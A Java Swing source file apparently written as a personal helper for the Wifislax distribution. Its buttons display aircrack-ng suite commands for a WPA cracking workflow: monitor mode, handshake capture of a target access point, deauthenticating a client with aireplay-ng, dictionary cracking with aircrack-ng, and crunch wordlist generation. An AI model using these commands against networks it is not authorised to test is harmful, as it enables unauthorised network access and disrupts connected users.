package bydan.linux.ventanas.wifislax;

import java.awt.BorderLayout;
import java.awt.EventQueue;

import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;

import bydan.linux.base.Constantes;
import net.miginfocom.swing.MigLayout;
import javax.swing.JTabbedPane;
import javax.swing.JLabel;
import javax.swing.JButton;
import javax.swing.JTextField;
import javax.swing.JTextArea;
import javax.swing.JScrollPane;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;

public class WpaWirelessJFrame extends JFrame {

	private JPanel contentPane;
	private JTextField textFieldWpaWireless;
	private JTextArea textAreaWpaWireless;

	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					WpaWirelessJFrame frame = new WpaWirelessJFrame();
					frame.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the frame.
	 */
	public WpaWirelessJFrame() {
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 500, 450);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		contentPane.setLayout(new MigLayout("", "[]", "[grow]"));
		
		JTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		contentPane.add(tabbedPane, "cell 0 0,grow");
		
		JPanel panelWapWireless = new JPanel();
		tabbedPane.addTab("Wap Wireless", null, panelWapWireless, null);
		panelWapWireless.setLayout(new MigLayout("", "[grow][330.00,grow]", "[][][][][][][][][grow]"));
		
		JLabel label_4 = new JLabel("Detener Procesos");
		panelWapWireless.add(label_4, "cell 0 0");
		
		JButton button_2 = new JButton("check kill");
		button_2.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String sComando="";
				
				sComando="airmon-ng check kill\r\n";
				
				textFieldWpaWireless.setText(sComando);
				
				sComando+="kill 1745\r\n";
				sComando+="kill 4578\r\n";
				sComando+="NetworkService start\r\n";
				
				textAreaWpaWireless.setText(sComando);
			}
		});
		panelWapWireless.add(button_2, "cell 1 0");
		
		JLabel label = new JLabel("Levantar/Detener Monitor");
		panelWapWireless.add(label, "cell 0 1");
		
		JButton button = new JButton("airmon-ng");
		button.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String sComando="";
				
				sComando="airmon-ng start "+Constantes.NOMBRE_WLAN+" 1";
				
				textFieldWpaWireless.setText(sComando);
				
				sComando+="\r\nairmon-ng stop "+Constantes.NOMBRE_WLAN_MONITOR+"";
				
				textAreaWpaWireless.setText(sComando);
			}
		});
		panelWapWireless.add(button, "cell 1 1");
		
		JLabel label_1 = new JLabel("Mostrar Interfaces");
		panelWapWireless.add(label_1, "cell 0 2");
		
		JButton button_1 = new JButton("airmon-ng2");
		button_1.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String sComando="";
				
				sComando="airmon-ng";
				
				textFieldWpaWireless.setText(sComando);
				
				sComando+="";
				
				textAreaWpaWireless.setText(sComando);
			}
		});
		panelWapWireless.add(button_1, "cell 1 2");
		
		JLabel label_2 = new JLabel("Escuchar Wireless");
		panelWapWireless.add(label_2, "cell 0 3");
		
		JButton btnAirodumpng = new JButton("airodump-ng");
		btnAirodumpng.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String sComando="";
				
				sComando="airodump-ng -c "+Constantes.CANAL+" --bssid "+Constantes.MAC_AP+" -w psk_wpa "+Constantes.NOMBRE_WLAN_MONITOR+"";
				
				textFieldWpaWireless.setText(sComando);
				
				sComando="";
				
				textAreaWpaWireless.setText(sComando);
			}
		});
		panelWapWireless.add(btnAirodumpng, "cell 1 3");
		
		JLabel lblHusmearElTrfico = new JLabel("Husmear el Tráfico");
		panelWapWireless.add(lblHusmearElTrfico, "cell 0 4");
		
		JButton btnAireplayng = new JButton("aireplay-ng");
		btnAireplayng.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String sComando="";
				
				sComando="aireplay-ng -0 1 -a "+Constantes.MAC_AP+" -c "+Constantes.MAC_CLIENTE+" "+Constantes.NOMBRE_WLAN_MONITOR+"";
				
				textFieldWpaWireless.setText(sComando);
				
				sComando="";
				
				textAreaWpaWireless.setText(sComando);
			}
		});
		panelWapWireless.add(btnAireplayng, "cell 1 4");
		
		JLabel label_3 = new JLabel("Crackear");
		panelWapWireless.add(label_3, "cell 0 5");
		
		JButton btnAircrackng = new JButton("aircrack-ng");
		btnAircrackng.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String sComando="";
				
				sComando="aircrack-ng -w dictionary.lst -b "+Constantes.MAC_AP+" psk*.cap";
				
				textFieldWpaWireless.setText(sComando);
				
				sComando="aircrack-ng  wpa2-crack-01.cap -w dictionary.lst";
				
				textAreaWpaWireless.setText(sComando);
			}
		});
		panelWapWireless.add(btnAircrackng, "cell 1 5");
		
		JLabel lblCrearDiccionario = new JLabel("Crear Diccionario");
		panelWapWireless.add(lblCrearDiccionario, "cell 0 6");
		
		JButton btnCrunch = new JButton("crunch");
		btnCrunch.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String sComando="";
				
				sComando="crunch 8 8 abcdef0123456789 > diccionario.lst";
				
				textFieldWpaWireless.setText(sComando);
				
				sComando="";
				
				textAreaWpaWireless.setText(sComando);
			}
		});
		panelWapWireless.add(btnCrunch, "cell 1 6");
		
		textFieldWpaWireless = new JTextField();
		panelWapWireless.add(textFieldWpaWireless, "cell 0 7 2 1,growx");
		textFieldWpaWireless.setColumns(10);
		
		JScrollPane scrollPane = new JScrollPane();
		panelWapWireless.add(scrollPane, "cell 0 8 2 1,grow");
		
		textAreaWpaWireless = new JTextArea();
		scrollPane.setViewportView(textAreaWpaWireless);
	}

}
